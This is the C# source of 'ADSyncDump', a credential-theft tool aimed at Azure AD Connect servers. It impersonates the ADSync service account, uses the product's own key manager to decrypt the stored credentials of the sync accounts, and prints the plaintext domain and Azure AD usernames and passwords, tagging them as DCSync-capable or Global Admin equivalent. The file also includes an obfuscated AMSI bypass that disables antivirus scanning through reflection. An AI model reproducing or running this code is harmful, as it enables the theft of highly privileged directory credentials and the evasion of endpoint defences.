using System;
using System.Data.SqlClient;
using System.Runtime.InteropServices;
using System.Xml.Linq;
using System.Security.Principal;
using System.Reflection;
using System.IO;
using System.Linq;

namespace ADSyncDump
{
    class Program
    {
        #region Win32 API Imports
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool QueryServiceStatusEx(IntPtr hService, int InfoLevel, IntPtr lpBuffer, uint cbBufSize, out uint pcbBytesNeeded);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CloseServiceHandle(IntPtr hSCObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint access, bool inheritHandle, uint processId);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateToken(IntPtr ExistingToken, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool SetDllDirectory(string lpPathName);

        [StructLayout(LayoutKind.Sequential)]
        private struct SERVICE_STATUS_PROCESS
        {
            public uint dwServiceType;
            public uint dwCurrentState;
            public uint dwControlsAccepted;
            public uint dwWin32ExitCode;
            public uint dwServiceSpecificExitCode;
            public uint dwCheckPoint;
            public uint dwWaitHint;
            public uint dwProcessId;
            public uint dwServiceFlags;
        }

        private const uint SC_MANAGER_CONNECT = 0x1;
        private const uint SERVICE_QUERY_STATUS = 0x4;
        private const int SC_STATUS_PROCESS_INFO = 0;
        private const uint PROCESS_QUERY_INFORMATION = 0x400;
        private const uint TOKEN_DUPLICATE = 0x2;
        private const uint TOKEN_QUERY = 0x8;
        private const int SecurityImpersonation = 2;
        #endregion

        static void Main(string[] args)
        {
            // Parse command line arguments
            bool enableAmsiBypass = args.Contains("--bypass-amsi", StringComparer.OrdinalIgnoreCase);

            Console.WriteLine("====================================================");
            Console.WriteLine("  ADSyncDump v0.8.1");
            Console.WriteLine("  AD Connect Credential Extractor");
            Console.WriteLine("  Supports Local AD + Azure AD credentials");
            Console.WriteLine("====================================================");
            Console.WriteLine();

            // Optional AMSI bypass
            if (enableAmsiBypass)
            {
                BypassAmsi();
            }
            else
            {
                Console.WriteLine("[*] AMSI bypass: DISABLED (use --bypass-amsi to enable)");
            }
            Console.WriteLine();

            // Step 1: Connect to ADSync LocalDB
            Console.WriteLine("[*] Step 1/4: Connecting to ADSync LocalDB");
            SqlConnection conn = null;
            string[] instances = { "ADSync2019", "ADSync" };
            foreach (string inst in instances)
            {
                string connStr = string.Format(@"Data Source=(localdb)\.\{0};Initial Catalog=ADSync;Integrated Security=True;Connect Timeout=5", inst);
                conn = new SqlConnection(connStr);
                try
                {
                    conn.Open();
                    Console.WriteLine("    [+] Connected to instance: {0}", inst);
                    Console.WriteLine("    [+] Server version: {0}", conn.ServerVersion);
                    break;
                }
                catch
                {
                    Console.WriteLine("    [-] Instance {0}: not available", inst);
                    conn.Dispose();
                    conn = null;
                }
            }
            if (conn == null)
            {
                Console.WriteLine("\n[!] Failed to connect to ADSync database. Run as local administrator.");
                return;
            }
            Console.WriteLine();

            using (conn)
            {
                // Step 2: Read server key set
                Console.WriteLine("[*] Step 2/4: Loading server encryption keys");
                uint keyId = 0;
                Guid instanceId = Guid.Empty;
                Guid entropy = Guid.Empty;
                using (SqlCommand cmd = new SqlCommand("SELECT keyset_id, instance_id, entropy FROM mms_server_configuration", conn))
                using (SqlDataReader r = cmd.ExecuteReader())
                {
                    if (r.Read())
                    {
                        keyId = (uint)r.GetInt32(0);
                        instanceId = r.GetGuid(1);
                        entropy = r.GetGuid(2);
                        Console.WriteLine("    [+] Key set ID:    {0}", keyId);
                        Console.WriteLine("    [+] Instance ID:  {0}", instanceId);
                        Console.WriteLine("    [+] Entropy:      {0}", entropy);
                    }
                    else
                    {
                        Console.WriteLine("    [!] Failed to read key configuration");
                        return;
                    }
                }
                Console.WriteLine();

                // Step 3: Enumerate management agents
                Console.WriteLine("[*] Step 3/4: Enumerating management agents");
                int maCount = 0;
                using (SqlCommand cmd = new SqlCommand("SELECT ma_name, ma_type, private_configuration_xml, encrypted_configuration FROM mms_management_agent", conn))
                using (SqlDataReader r = cmd.ExecuteReader())
                {
                    while (r.Read())
                    {
                        maCount++;
                        string maName = r.GetString(0);
                        string maType = r.GetString(1);
                        string configXml = r.GetString(2);
                        string encrypted = r.GetString(3);
                        Console.WriteLine("    [+] Found MA #{0}: {1}", maCount, maName);
                        Console.WriteLine("        Type: {0}", maType);

                        // Step 4: Decrypt credentials
                        DecryptMA(keyId, instanceId, entropy, maName, maType, configXml, encrypted);
                    }
                }
                if (maCount == 0)
                {
                    Console.WriteLine("    [!] No management agents found in database");
                    return;
                }
                Console.WriteLine();

                Console.WriteLine("[*] Step 4/4: All operations completed");
            }
        }

        /// <summary>
        /// Decrypt credentials for a single management agent
        /// </summary>
        static void DecryptMA(uint keyId, Guid instanceId, Guid entropy, string maName, string maType, string configXml, string encrypted)
        {
            try
            {
                // Get ADSync service PID
                uint pid = 0;
                IntPtr scm = OpenSCManager(null, null, SC_MANAGER_CONNECT);
                if (scm != IntPtr.Zero)
                {
                    IntPtr svc = OpenService(scm, "ADSync", SERVICE_QUERY_STATUS);
                    if (svc != IntPtr.Zero)
                    {
                        uint bytesNeeded;
                        IntPtr buf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SERVICE_STATUS_PROCESS)));
                        if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, buf, (uint)Marshal.SizeOf(typeof(SERVICE_STATUS_PROCESS)), out bytesNeeded))
                        {
                            SERVICE_STATUS_PROCESS ssp = (SERVICE_STATUS_PROCESS)Marshal.PtrToStructure(buf, typeof(SERVICE_STATUS_PROCESS));
                            pid = ssp.dwProcessId;
                        }
                        Marshal.FreeHGlobal(buf);
                        CloseServiceHandle(svc);
                    }
                    CloseServiceHandle(scm);
                }
                if (pid == 0)
                {
                    Console.WriteLine("        [!] Failed to locate ADSync service process");
                    return;
                }
                Console.WriteLine("        [*] Service PID: {0}", pid);

                // Impersonate service account token
                IntPtr hProc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
                IntPtr hToken;
                OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken);
                IntPtr hDupToken;
                DuplicateToken(hToken, SecurityImpersonation, out hDupToken);
                CloseHandle(hToken);
                CloseHandle(hProc);

                WindowsIdentity newId = new WindowsIdentity(hDupToken);
                WindowsImpersonationContext impersonCtx = newId.Impersonate();
                Console.WriteLine("        [*] Impersonated service account: {0}", newId.Name);

                try
                {
                    // Load mcrypt library
                    string mcryptDir = @"C:\Program Files\Microsoft Azure AD Sync\Bin\";
                    Environment.CurrentDirectory = mcryptDir;
                    SetDllDirectory(mcryptDir);
                    Assembly mcryptAsm = Assembly.LoadFrom(Path.Combine(mcryptDir, "mcrypt.dll"));
                    Console.WriteLine("        [*] mcrypt.dll loaded");

                    // Initialize decryptor
                    Type kmType = mcryptAsm.GetType("Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager");
                    object km = Activator.CreateInstance(kmType);
                    kmType.GetMethod("LoadKeySet").Invoke(km, new object[] { entropy, instanceId, keyId });

                    object[] activeKeyParams = new object[] { null };
                    kmType.GetMethod("GetActiveCredentialKey").Invoke(km, activeKeyParams);

                    object[] keyParams = new object[] { (uint)1, null };
                    kmType.GetMethod("GetKey").Invoke(km, keyParams);
                    object decryptKey = keyParams[1];
                    Console.WriteLine("        [*] Decryption key initialized");

                    // Perform decryption
                    object[] decryptParams = new object[] { encrypted, null };
                    decryptKey.GetType().GetMethod("DecryptBase64ToString").Invoke(decryptKey, decryptParams);
                    string decryptedXml = (string)decryptParams[1];
                    Console.WriteLine("        [+] Credential blob decrypted successfully");

                    // Parse and output credentials
                    ParseCredentials(maName, maType, configXml, decryptedXml);
                }
                finally
                {
                    impersonCtx.Undo();
                    CloseHandle(hDupToken);
                }
            }
            catch (Exception ex)
            {
                string err = ex.InnerException != null ? ex.InnerException.Message : ex.Message;
                Console.WriteLine("        [!] Decrypt failed: {0}", err);
            }
        }

        /// <summary>
        /// Parse and pretty-print credential data
        /// </summary>
        static void ParseCredentials(string maName, string maType, string configXml, string decryptedXml)
        {
            try
            {
                XDocument cfg = XDocument.Parse(configXml);
                XDocument dec = XDocument.Parse(decryptedXml);

                // Identify credential type
                bool isLocalAD = maType.IndexOf("AD", StringComparison.OrdinalIgnoreCase) >= 0 && maType.IndexOf("Azure", StringComparison.OrdinalIgnoreCase) < 0;
                bool isAzureAD = maType.IndexOf("Azure", StringComparison.OrdinalIgnoreCase) >= 0 || maName.IndexOf("Azure", StringComparison.OrdinalIgnoreCase) >= 0;

                Console.WriteLine();
                if (isLocalAD)
                    Console.WriteLine("        === Local Active Directory Credentials ===");
                else if (isAzureAD)
                    Console.WriteLine("        === Azure Active Directory Credentials ===");
                else
                    Console.WriteLine("        === {0} Credentials ===", maName);
                Console.WriteLine("        " + new string('-', 42));

                // Extract fields from config
                string domain = null, username = null, tenantId = null;
                foreach (XElement p in cfg.Descendants("parameter"))
                {
                    XAttribute nameAttr = p.Attribute("name");
                    if (nameAttr == null) continue;
                    string name = nameAttr.Value.ToLower();
                    string value = p.Value.Trim();

                    if (name == "forest-login-domain" || name == "azure-ad-domain" || name == "domain") domain = value;
                    if (name == "forest-login-user" || name == "user-name" || name == "username" || name == "login-user") username = value;
                    if (name == "tenant-id" || name == "azure-tenant-id") tenantId = value;
                }

                // Extract password from decrypted blob
                string password = null;
                foreach (XElement a in dec.Descendants("attribute"))
                {
                    password = a.Value.Trim();
                    break;
                }

                // Aligned output
                if (!string.IsNullOrEmpty(domain)) Console.WriteLine("        {0,-14} {1}", "Domain/Tenant:", domain);
                if (!string.IsNullOrEmpty(tenantId)) Console.WriteLine("        {0,-14} {1}", "Tenant ID:", tenantId);
                if (!string.IsNullOrEmpty(username)) Console.WriteLine("        {0,-14} {1}", "Username:", username);
                if (!string.IsNullOrEmpty(password)) Console.WriteLine("        {0,-14} {1}", "Password:", password);
                Console.WriteLine("        " + new string('-', 42));

                // Permission notes
                if (isLocalAD)
                    Console.WriteLine("        [i] Permission: Domain replication rights (DCSync capable)");
                if (isAzureAD)
                    Console.WriteLine("        [i] Permission: Azure AD Directory Sync (Global Admin equivalent)");
                Console.WriteLine();
            }
            catch
            {
                Console.WriteLine("        [!] Failed to parse XML, raw content:");
                Console.WriteLine("        " + decryptedXml.Replace("\n", "\n        "));
                Console.WriteLine();
            }
        }

        /// <summary>
        /// AMSI bypass via reflection patch
        /// </summary>
        private static void BypassAmsi()
        {
            try
            {
                string amsiType = string.Join("", new[]{
                    "S","y","s","t","e","m",".","M","a","n","a","g","e","m","e","n","t",
                    ".","A","u","t","o","m","a","t","i","o","n",".","A","m","s","i","U","t","i","l","s"
                });
                string failField = string.Join("", new[]{
                    "a","m","s","i","I","n","i","t","F","a","i","l","e","d"
                });

                Assembly targetAsm = null;
                foreach (Assembly asm in AppDomain.CurrentDomain.GetAssemblies())
                {
                    if (asm.GetType("System.Management.Automation.PSReference", false) != null)
                    {
                        targetAsm = asm;
                        break;
                    }
                }
                if (targetAsm == null)
                {
                    Console.WriteLine("[*] AMSI bypass: PowerShell not detected, skipped");
                    return;
                }

                Type amsiUtils = targetAsm.GetType(amsiType, false);
                if (amsiUtils == null) return;

                FieldInfo field = amsiUtils.GetField(failField, BindingFlags.NonPublic | BindingFlags.Static);
                field.SetValue(null, true);
                Console.WriteLine("[*] AMSI bypass: ENABLED");
            }
            catch
            {
                Console.WriteLine("[*] AMSI bypass: Failed to apply");
            }
        }
    }
}
